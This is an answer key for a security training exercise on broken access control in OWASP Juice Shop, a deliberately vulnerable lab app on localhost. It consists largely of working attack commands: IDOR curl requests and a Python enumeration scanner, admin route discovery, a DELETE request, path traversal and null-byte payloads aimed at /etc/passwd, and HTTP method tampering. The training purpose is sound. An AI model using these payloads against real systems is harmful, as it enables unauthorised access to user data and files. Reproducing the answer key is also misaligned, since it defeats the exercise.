# Exercise 05: Broken Access Control - ANSWERS

## Task 5.1: Horizontal Privilege Escalation (IDOR)

### Accessing Other Users' Baskets:

```bash
# First, get your own basket (authenticated as user)
TOKEN="your-jwt-token-here"

# Your basket (assume ID 1)
curl http://localhost:8000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN"

# Access other users' baskets by changing ID
curl http://localhost:8000/rest/basket/2 \
  -H "Authorization: Bearer $TOKEN"

curl http://localhost:8000/rest/basket/3 \
  -H "Authorization: Bearer $TOKEN"
```

### Accessing Other Users' Data:

```bash
# Get user 1's details
curl http://localhost:8000/api/Users/1 \
  -H "Authorization: Bearer $TOKEN"

# Get user 2's details
curl http://localhost:8000/api/Users/2 \
  -H "Authorization: Bearer $TOKEN"

# Enumerate all users
for i in {1..20}; do
  echo "User $i:"
  curl -s http://localhost:8000/api/Users/$i \
    -H "Authorization: Bearer $TOKEN" | jq '.data.email'
done
```

### Other IDOR Endpoints:

```bash
# Orders
curl http://localhost:8000/rest/track-order/1
curl http://localhost:8000/rest/track-order/2

# Feedback
curl http://localhost:8000/api/Feedbacks/1
curl http://localhost:8000/api/Feedbacks/2

# Complaints
curl http://localhost:8000/api/Complaints/1
```

---

## Task 5.2: Vertical Privilege Escalation

### Accessing Admin Panel:

**URL:** `http://localhost:8000/#/administration`

### Steps:
1. Log in as any user
2. Navigate to `/#/administration`
3. Access admin functionality

### Finding Hidden Admin Routes:

```bash
# Check JavaScript for routes
curl -s http://localhost:8000/main.js | grep -oE 'path:\s*"[^"]*"' | sort -u

# Found routes:
# - /#/administration
# - /#/accounting
# - /#/privacy-security/data-export
# - /#/deluxe-membership
```

### Admin API Endpoints:

```bash
# View all feedbacks (admin)
curl http://localhost:8000/api/Feedbacks \
  -H "Authorization: Bearer $TOKEN"

# Delete feedback
curl -X DELETE http://localhost:8000/api/Feedbacks/1 \
  -H "Authorization: Bearer $TOKEN"

# View all users
curl http://localhost:8000/api/Users \
  -H "Authorization: Bearer $TOKEN"
```

---

## Task 5.3: Sensitive Data Exposure

### Accessing FTP Directory:

```bash
# List FTP contents
curl http://localhost:8000/ftp

# Download files
curl -O http://localhost:8000/ftp/acquisitions.md
curl -O http://localhost:8000/ftp/coupons_2013.md.bak
curl -O http://localhost:8000/ftp/eastere.gg
curl -O http://localhost:8000/ftp/encrypt.pyc
curl -O http://localhost:8000/ftp/incident-support.kdbx
curl -O http://localhost:8000/ftp/legal.md
curl -O http://localhost:8000/ftp/package.json.bak
curl -O http://localhost:8000/ftp/quarantine.zip
curl -O http://localhost:8000/ftp/suspicious_errors.yml
```

### Path Traversal Attack:

**Null Byte Injection (if applicable):**
```bash
curl "http://localhost:8000/ftp/../../etc/passwd%2500.md"
curl "http://localhost:8000/ftp/..%2f..%2fetc%2fpasswd%2500.md"
```

**Poison Null Byte:**
```bash
curl "http://localhost:8000/ftp/coupons_2013.md.bak%00.md"
```

### Files Found:

| File | Contents |
|------|----------|
| acquisitions.md | Company acquisition info |
| coupons_2013.md.bak | Old coupon codes |
| package.json.bak | Backup with dependencies |
| incident-support.kdbx | KeePass database (encrypted) |
| quarantine.zip | Potentially malicious files |

### Downloading Confidential Documents:

```bash
# Using path traversal to access files outside /ftp
curl "http://localhost:8000/ftp/legal.md%250A.md"

# Null byte bypass
curl "http://localhost:8000/ftp/package.json.bak%2500.md"
```

---

## Complete IDOR Enumeration Script:

```python
#!/usr/bin/env python3
"""IDOR Scanner for Juice Shop"""

import requests

BASE_URL = "http://localhost:8000"
TOKEN = "your-jwt-token-here"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

endpoints = [
    "/api/Users/{}",
    "/rest/basket/{}",
    "/api/Feedbacks/{}",
    "/api/Complaints/{}",
    "/api/Recycles/{}",
    "/rest/track-order/{}",
]

for endpoint in endpoints:
    print(f"\n[*] Testing {endpoint}")
    for i in range(1, 11):
        url = BASE_URL + endpoint.format(i)
        r = requests.get(url, headers=HEADERS)
        if r.status_code == 200:
            print(f"  [+] ID {i}: Accessible")
        else:
            print(f"  [-] ID {i}: {r.status_code}")
```

---

## Access Control Bypass via HTTP Method Tampering:

```bash
# If GET is blocked, try other methods
curl -X GET http://localhost:8000/api/Users/1 # Blocked?
curl -X POST http://localhost:8000/api/Users/1 # Allowed?
curl -X PUT http://localhost:8000/api/Users/1 # Allowed?
curl -X OPTIONS http://localhost:8000/api/Users/1 # Check allowed methods
```

---

## Summary:

```
IDOR Vulnerabilities:
1. Endpoint: /rest/basket/{id}
   - Accessed User ID: 2, 3, 4...
   - Impact: View/modify other users' carts

2. Endpoint: /api/Users/{id}
   - Accessed Data: Email, password hash, role
   - Impact: User enumeration

Admin Access:
- URL: /#/administration
- Method: Direct navigation (no real authorization check)

Sensitive Files Found:
1. /ftp/acquisitions.md - M&A information
2. /ftp/coupons_2013.md.bak - Valid coupon codes
3. /ftp/package.json.bak - Dependency information
4. /ftp/incident-support.kdbx - Password database

Path Traversal Success:
- Payload: %2500.md (null byte)
- File Accessed: Files outside allowed directory
```
